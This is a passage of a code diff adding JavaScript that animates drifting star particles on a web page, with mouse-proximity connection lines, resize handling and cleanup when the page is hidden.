+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
